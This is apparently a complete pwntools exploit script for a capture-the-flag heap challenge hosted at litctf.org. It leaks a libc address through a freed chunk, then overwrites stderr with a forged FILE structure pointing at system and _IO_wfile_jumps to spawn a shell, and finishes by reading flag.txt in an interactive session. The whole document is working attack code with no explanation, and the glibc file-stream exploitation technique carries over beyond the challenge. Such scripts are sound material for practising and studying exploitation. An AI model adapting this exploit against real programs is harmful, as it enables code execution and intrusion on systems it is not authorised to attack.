from pwn import *
from pwnlib.elf import byte

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("litctf.org", 31778)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


rocks = 0x4080
mound = 0x4060


def create(idx, size):
    io.sendlineafter("> ", "1")
    io.sendlineafter("Idx?\n> ", str(idx))
    io.sendlineafter("Size?\n> ", str(size))


def delete(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Idx?\n> ", str(idx))


def view(idx):
    io.sendlineafter("> ", "3")
    io.sendlineafter("Idx?\n> ", str(idx))


def edit(idx, content):
    io.sendlineafter("> ", "4")
    io.sendlineafter("Idx?\n> ", str(idx))
    io.sendafter("Content?\n>", content)


create(0, 0x20)
create(1, 0x3ff)
delete(1)
view(0)
leak = u64(io.recvuntil("\x0a")[-7:-1].ljust(8, b"\x00"))
anon = leak - 0x238
log.success("anon :-----> " + hex(anon))

libc.address = leak - 0x238 + 0x10000
log.success("libc :-----> " + hex(libc.address))

libc_environ = libc.symbols["__environ"]
log.success("environ:-----> " + hex(libc_environ))
log.success(hex(libc.address+0x1ed440-0x3ff-4))

stderr_adr = libc.symbols["_IO_2_1_stderr_"]
log.success("stderr :-----> " + hex(stderr_adr))

file = FileStructure(0)
file.flags = u64(p32(0xfbad0101) + b";sh\0")
file._IO_save_end = libc.sym["system"]
file._lock = stderr_adr - 0x10
file._wide_data = stderr_adr - 0x10
file._offset = 0
file._old_offset = 0
payload = b"\x00"*24 + p32(1) + p32(0) + p64(0)
payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10)
payload += p64(libc.symbols["_IO_wfile_jumps"] + 0x18 - 0x58)
file.unknown2 = payload

# create(10, 0xe8+4)
# delete(10)
log.success(len(bytes(file)))

edit(0, p64(anon))
create(3, 0x3ff)
edit(3, p64(0)+p32(0) + 14*p64(0)+p64(stderr_adr-4-0x10))
create(4, 0xe8+7)
edit(4, b"0"*0x10 + bytes(file)[:0xe0-1])

ddebug("breakrva 0x163F\n breakrva 0x013F0 \n  breakrva 0172e\n breakrva 0x1351\n continue")
io.sendlineafter("> ", "0")

io.sendline(b"cat flag.txt")
io.interactive()
